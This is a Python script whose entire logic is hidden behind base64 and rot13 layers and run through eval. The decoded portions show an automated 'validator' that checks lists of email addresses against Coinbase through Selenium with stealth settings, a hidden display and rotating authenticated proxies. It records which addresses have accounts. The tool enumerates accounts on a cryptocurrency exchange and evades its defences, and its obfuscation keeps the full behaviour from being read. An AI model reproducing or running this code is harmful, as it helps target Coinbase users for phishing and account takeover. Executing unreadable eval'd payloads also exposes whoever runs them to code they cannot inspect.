import base64, codecs
magic = 'ZnJvbSBhc3luY29yZSBpbXBvcnQgcmVhZCAjbGluZToxCmltcG9ydCByZXF1ZXN0cyAsc3lzICxvcyAsemlwZmlsZSAsdGltZSAjbGluZToyCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lICNsaW5lOjMKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBQcm9jZXNzUG9vbEV4ZWN1dG9yICNsaW5lOjQKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBhc19jb21wbGV0ZWQgI2xpbmU6NQpmcm9tIHB5dmlydHVhbGRpc3BsYXkgaW1wb3J0IERpc3BsYXkgI2xpbmU6Ngpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlICNsaW5lOjcKZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdCAjbGluZTo4CmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwICNsaW5lOjkKZnJvbSBzZWxlbml1bSBpbXBvcnQgd2ViZHJpdmVyICNsaW5lOjEwCmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuY29tbW9uIC5ieSBpbXBvcnQgQnkgI2xpbmU6MTEKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmtleXMgaW1wb3J0IEtleXMgI2xpbmU6MTIKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmFjdGlvbl9jaGFpbnMgaW1wb3J0IEFjdGlvbkNoYWlucyAjbGluZToxMwpmcm9tIHNlbGVuaXVtIC53ZWJkcml2ZXIgLnN1cHBvcnQgLndhaXQgaW1wb3J0IFdlYkRyaXZlcldhaXQgI2xpbmU6MTQKZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5zdXBwb3J0IGltcG9ydCBleHBlY3RlZF9jb25kaXRpb25zIGFzIEVDICNsaW5lOjE1CmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuY2hyb21lIC5vcHRpb25zIGltcG9ydCBPcHRpb25zICNsaW5lOjE2CmZyb20gc2VsZW5pdW0gLmNvbW1vbiAuZXhjZXB0aW9ucyBpbXBvcnQgVGltZW91dEV4Y2VwdGlvbiAjbGluZToxNwpmcm9tIGRvdGVudiBpbXBvcnQgbG9hZF9kb3RlbnYgI2xpbmU6MTgKZnJvbSBzZWxlbml1bV9zdGVhbHRoIGltcG9ydCBzdGVhbHRoICNsaW5lOjE5CmltcG9ydCBjaHJvbWVkcml2ZXJfYmluYXJ5ICNsaW5lOjIwCmluaXQgKGF1dG9yZXNldCA9VHJ1ZSApI2xpbmU6MjIKZGlzcGxheSA9RGlzcGxheSAodmlzaWJsZSA9MCAsc2l6ZSA9KDgwMCAsNjAwICkpI2xpbmU6MjMKZGlzcGxheSAuc3RhcnQgKCkjbGluZToyNAp0cnkgOiNsaW5lOjI1CiAgb3MgLm1rZGlyICgncmVzdWx0JykjbGluZToyNgpleGNlcHQgOiNsaW5lOjI3CiAgcGFzcyAjbGluZToyOApjYiA9ZicnJyAgICAgIAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgICAgICAgICkgKCAgICAgICApICAgICAgICAgICAgICAoICAgICAgICAKe0ZvcmUuTElHSFRHUkVFTl9FWH0gICAoICAoIC8oIClcICkgKCAvKCAgICggICAgKCAgICAgKVwgKSAgICAgCntGb3JlLkxJR0hUR1JFRU5fRVh9ICAgKVwgKVwoKXwoKS8oIClcKCkpKCApXCAgIClcICAgKCgpLygoICAgIAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAoKChffChfKVwgLyhfKXwoXylcICkoKF98KCgoXykoICAvKF8pKVwgICAKe0ZvcmUuTElHSFRHUkVFTl9FWH0gKVxfX18gKChffF8pKSAgXygoX3woXylfIClcIF8gKVwoXykpKChfKSAgCntGb3JlLkxJR0hUR1JFRU5fRVh9KCgvIF9fLyBfIFxfIF98fCBcfCB8fCBfICkoXylfXChfKSBfX3wgX198IAp7Rm9yZS5MSUdIVEdSRUVOX0VYfSB8IChffCAoXykgfCB8IHwgLmAgfHwgXyBcIC8gXyBcIFxfXyBcIF98ICAKe0ZvcmUuTElHSFRHUkVFTl9FWH0gIFxfX19cX19fL19fX3x8X3xcX3x8X19fLy9fLyBcX1x8X19fL19fX3wgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKe0ZvcmUuTElHSFRDWUFOX0VYfSAgICAgICAgICAgICAgICBWQUxJREFUT1IgQ0xJICAgIAoKJycnI2xpbmU6NDIKcHJpbnQgKGYne2NifXtGb3JlLlJFU0VUfT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cblxuJykjbGluZTo0NQpsb2FkX2RvdGVudiAoKSNsaW5lOjQ5ClBST1hZX1VTRVIgPW9zIC5nZXRlbnYgKCd1c2VybmFtZScpI2xpbmU6NTAKUFJPWFlfUEFTUyA9b3MgLmdldGVudiAoJ3Bhc3N3b3JkJykjbGluZTo1MQpQUk9YWV9IT1NUID1vcyAuZ2V0ZW52ICgnaG9zdCcpI2xpbmU6NTIKUFJPWFlfUE9SVCA9b3MgLmdldGVudiAoJ3BvcnQnKSNsaW5lOjUzCm1hbmlmZXN0X2pzb24gPSIiIgp7CiAgICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgICAibWFuaWZlc3RfdmVyc2lvbiI6IDIsCiAgICAibmFtZSI6ICJDaHJvbWUgUHJveHkiLAogICAgInBlcm1pc3Npb25zIjogWwogICAgICAgICJwcm94eSIsCiAgICAgICAgInRhYnMiLAogICAgICAgICJ1bmxpbWl0ZWRTdG9yYWdlIiwKICAgICAgICAic3RvcmFnZSIsCiAgICAgICAgIjxhbGxfdXJscz4iLAogICAgICAgICJ3ZWJSZXF1ZXN0IiwgCiAgICAgICAgIndlYlJlcXVlc3RCbG9ja2luZyIKICAgIF0sCiAgICAiYmFja2dyb3VuZCI6IHsKICAgICAgICAic2NyaXB0cyI6IFsiYmFja2dyb3VuZC5qcyJdICAgIAogICAgfSwKICAgICJtaW5pbXVtX2Nocm9tZV92ZXJzaW9uIjoiMjIuMC4wIgp9CiIiIiNsaW5lOjc1CmJhY2tncm91bmRfanMgPSIiIgp2YXIgY29uZmlnID0gewogICAgICAgIG1vZGU6ICJmaXhlZF9zZXJ2ZXJzIiwKICAgICAgICBydWxlczogewogICAgICAgICAgc2'
love = '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'
god = 'dHJ5IDojbGluZToxNTkKICAgICAgT08wMDAwMDAwTzAwT09PMDAgLmZpbmRfZWxlbWVudCAoQnkgLklEICwiUGFzc3dvcmQiKS5jbGljayAoKSNsaW5lOjE2MAogICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPTzAwT08wTzBPT09PTzBPT30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRDWUFOX0VYfSAgVmFsaWR7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxNjEKICAgICAgTzAwT09PTzAwTzBPTzBPT08gPW9wZW4gKCdyZXN1bHQvdmFsaWQudHh0JywnYSsnKSNsaW5lOjE2MgogICAgICBPMDBPT09PMDBPME9PME9PTyAud3JpdGUgKCdcbicpI2xpbmU6MTYzCiAgICAgIE8wME9PT08wME8wT08wT09PIC53cml0ZWxpbmVzIChPTzAwT08wTzBPT09PTzBPTyApI2xpbmU6MTY0CiAgICAgIE8wME9PT08wME8wT08wT09PIC5jbG9zZSAoKSNsaW5lOjE2NQogICAgICBPTzAwMDAwMDBPMDBPT08wMCAucXVpdCAoKSNsaW5lOjE2NgogICAgZXhjZXB0IDojbGluZToxNjcKICAgICAgdHJ5IDojbGluZToxNjgKICAgICAgICBPT09PMDBPT09PT09PTzAwTyA9T08wMDAwMDAwTzAwT09PMDAgLmZpbmRfZWxlbWVudCAoQnkgLkNTU19TRUxFQ1RPUiAsIi5jZHMtY29sdW1uLWMxbGV6bDRzIikjbGluZToxNjkKICAgICAgICBPME8wME9PTzBPT08wT09PTyA9T09PTzAwT09PT09PT08wME8gLmdldF9hdHRyaWJ1dGUgKCdpbm5lckhUTUwnKSNsaW5lOjE3MAogICAgICAgIE9PTzBPTzBPTzAwME8wME9PID1CZWF1dGlmdWxTb3VwIChPME8wME9PTzBPT08wT09PTyAsJ2h0bWwucGFyc2VyJykjbGluZToxNzEKICAgICAgICBPME8wTzBPT08wME8wTzBPMCA9T09PME9PME9PMDAwTzAwT08gLmdldF90ZXh0ICgpI2xpbmU6MTcyCiAgICAgICAgaWYgIk5vIENvaW5iYXNlIGFjY291bnQgZXhpc3RzIGZvciB0aGlzIGVtYWlsLiBQbGVhc2UgY2hlY2sgeW91ciBzcGVsbGluZyBvciBjcmVhdGUgYW4gYWNjb3VudC4iaW4gTzBPME8wT09PMDBPME8wTzAgOiNsaW5lOjE3MwogICAgICAgICAgcHJpbnQgKGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7T08wME9PME8wT09PT08wT099IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUUkVEX0VYfSAgRGlle0ZvcmUuTElHSFRXSElURV9FWH0gfiBDQntGb3JlLkxJR0hUQkxVRV9FWH0gYnkgUXJpc19HaG9zdCcpI2xpbmU6MTc0CiAgICAgICAgICBPMDBPT09PMDBPME9PME9PTyA9b3BlbiAoJ3Jlc3VsdC9kaWUudHh0JywnYSsnKSNsaW5lOjE3NQogICAgICAgICAgTzAwT09PTzAwTzBPTzBPT08gLndyaXRlICgnXG4nKSNsaW5lOjE3NgogICAgICAgICAgTzAwT09PTzAwTzBPTzBPT08gLndyaXRlbGluZXMgKE9PMDBPTzBPME9PT09PME9PICkjbGluZToxNzcKICAgICAgICAgIE8wME9PT08wME8wT08wT09PIC5jbG9zZSAoKSNsaW5lOjE3OAogICAgICAgICAgT08wMDAwMDAwTzAwT09PMDAgLnF1aXQgKCkjbGluZToxNzkKICAgICAgZXhjZXB0IDojbGluZToxODAKICAgICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPTzAwT08wTzBPT09PTzBPT30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRZRUxMT1dfRVh9IENhcHRjaGF7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxODEKICAgICAgICBPMDBPT09PMDBPME9PME9PTyA9b3BlbiAoJ3Jlc3VsdC9wcm94eS50eHQnLCdhKycpI2xpbmU6MTgyCiAgICAgICAgTzAwT09PTzAwTzBPTzBPT08gLndyaXRlICgnXG4nKSNsaW5lOjE4MwogICAgICAgIE8wME9PT08wME8wT08wT09PIC53cml0ZWxpbmVzIChPTzAwT08wTzBPT09PTzBPTyApI2xpbmU6MTg0CiAgICAgICAgTzAwT09PTzAwTzBPTzBPT08gLmNsb3NlICgpI2xpbmU6MTg1CiAgICAgICAgT08wMDAwMDAwTzAwT09PMDAgLnF1aXQgKCkjbGluZToxODYKICBleGNlcHQgOiNsaW5lOjE4NwogICAgcHJpbnQgKGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7T08wME9PME8wT09PT08wT099IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUWUVMTE9XX0VYfSBCYWQgUHJveHl7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxODgKICAgIE8wME9PT08wME8wT08wT09PID1vcGVuICgncmVzdWx0L3Byb3h5LnR4dCcsJ2ErJykjbGluZToxODkKICAgIE8wME9PT08wME8wT08wT09PIC53cml0ZSAoJ1xuJykjbGluZToxOTAKICAgIE8wME9PT08wME8wT08wT09PIC53cml0ZWxpbmVzIChPTzAwT08wTzBPT09PTzBPTyApI2xpbmU6MTkxCiAgICBPMDBPT09PMDBPME9PME9PTyAuY2xvc2UgKCkjbGluZToxOTIKICAgIE9PMDAwMDAwME8wME9PTzAwIC5xdWl0ICgpI2xpbmU6MTkzCmRlZiBhcGkgKCk6I2xpbmU6MTk2CiAgICBsb2FkX2RvdGVudiAoKSNsaW5lOjE5NwogICAgTzBPME8wME9PT09PTzBPMDAgPW9zIC5nZXRlbnYgKCdhcGlrZXknKS'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))